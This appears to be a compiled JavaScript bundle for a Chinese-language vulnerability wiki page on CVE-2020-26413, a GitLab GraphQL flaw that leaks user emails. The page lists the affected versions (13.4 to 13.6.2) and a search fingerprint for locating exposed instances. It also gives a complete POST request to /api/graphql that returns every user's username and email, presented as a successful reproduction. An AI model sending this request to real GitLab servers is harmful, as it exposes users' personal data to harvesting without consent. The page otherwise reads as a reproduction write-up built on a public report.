(window.webpackJsonp=window.webpackJsonp||[]).push([[133],{2077:function(t,a,s){t.exports=s.p+"assets/img/gitlab-1.33a33396.png"},2078:function(t,a,s){t.exports=s.p+"assets/img/gitlab-2.3b5fa8a4.png"},2079:function(t,a,s){t.exports=s.p+"assets/img/gitlab-3.aab3e09c.png"},2080:function(t,a,s){t.exports=s.p+"assets/img/gitlab-4.2010a05c.png"},3125:function(t,a,s){"use strict";s.r(a);var r=s(64),e=Object(r.a)({},(function(){var t=this,a=t._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":t.$parent.slotKey}},[a("h1",{attrs:{id:"gitlab-graphql邮箱信息泄露漏洞-cve-2020-26413"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#gitlab-graphql邮箱信息泄露漏洞-cve-2020-26413"}},[t._v("#")]),t._v(" GitLab Graphql邮箱信息泄露漏洞 CVE-2020-26413")]),t._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[t._v("#")]),t._v(" 漏洞描述")]),t._v(" "),a("p",[t._v("GitLab中存在Graphql接口 输入构造的数据时会泄露用户邮箱和用户名")]),t._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[t._v("#")]),t._v(" 漏洞影响")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v("GitLab 13.4 - 13.6.2")]),a("br"),t._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[t._v("#")]),t._v(" 网络测绘")]),t._v(" "),a("a-checkbox",{attrs:{checked:""}},[t._v('title="GitLab"')]),a("br"),t._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[t._v("#")]),t._v(" 漏洞复现")]),t._v(" "),a("p",[t._v("漏洞来源为 hackone上的一篇公开报告")]),t._v(" "),a("a-alert",{attrs:{type:"success",message:"https://gitlab.com/gitlab-org/gitlab/-/issues/244275",description:"",showIcon:""}}),t._v(" "),a("br"),t._v(" "),a("p",[a("img",{attrs:{src:s(2077),alt:"img"}})]),t._v(" "),a("p",[t._v("意思为当使用构造的语句在接口查询时会返回邮箱信息，如图")]),t._v(" "),a("a-alert",{attrs:{type:"success",message:"访问 URL http://xxx.xxx.xxx.xxx/-//graphql-explorer",description:"",showIcon:""}}),t._v(" "),a("br"),t._v(" "),a("p",[a("img",{attrs:{src:s(2078),alt:"img"}})]),t._v(" "),a("p",[t._v("Gitlab本身不允许获取账号邮箱信息，这里通过调用 Graphql 用户名查询造成了邮箱泄露漏洞")]),t._v(" "),a("p",[t._v("查看完报告后发现漏洞利用需要有账号用户名，在不知道的情况下无法获取邮箱，在"),a("a",{attrs:{href:"https://graphql.cn/",target:"_blank",rel:"noopener noreferrer"}},[t._v("Graphql官网"),a("OutboundLink")],1),t._v("查看得知可以通过另一个构造的语句一次性返回所有的用户名和邮箱")]),t._v(" "),a("p",[a("img",{attrs:{src:s(2079),alt:"img"}})]),t._v(" "),a("p",[t._v("发包调用了 "),a("code",[t._v("/api/graphql")]),t._v(" 接口发送数据")]),t._v(" "),a("p",[t._v("完整数据包为")]),t._v(" "),a("div",{staticClass:"language-json line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-json"}},[a("code",[t._v("POST /api/graphql HTTP/"),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("1.1")]),t._v("\nHost"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v("\nContent-Length"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[t._v("212")]),t._v("\nContent-Type"),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),t._v(" application/json\n\n\n"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("{")]),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"query"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token string"}},[t._v('"{\\nusers {\\nedges {\\n  node {\\n    username\\n    email\\n    avatarUrl\\n    status {\\n      emoji\\n      message\\n      messageHtml\\n     }\\n    }\\n   }\\n  }\\n }"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"variables"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token null keyword"}},[t._v("null")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v(",")]),a("span",{pre:!0,attrs:{class:"token property"}},[t._v('"operationName"')]),a("span",{pre:!0,attrs:{class:"token operator"}},[t._v(":")]),a("span",{pre:!0,attrs:{class:"token null keyword"}},[t._v("null")]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[t._v("}")]),t._v("\n")])]),t._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[t._v("1")]),a("br"),a("span",{staticClass:"line-number"},[t._v("2")]),a("br"),a("span",{staticClass:"line-number"},[t._v("3")]),a("br"),a("span",{staticClass:"line-number"},[t._v("4")]),a("br"),a("span",{staticClass:"line-number"},[t._v("5")]),a("br"),a("span",{staticClass:"line-number"},[t._v("6")]),a("br"),a("span",{staticClass:"line-number"},[t._v("7")]),a("br")])]),a("p",[a("img",{attrs:{src:s(2080),alt:"img"}})]),t._v(" "),a("p",[t._v("成功返回数据，造成 Gitlab的用户邮箱信息泄露")])],1)}),[],!1,null,null,null);a.default=e.exports}}]);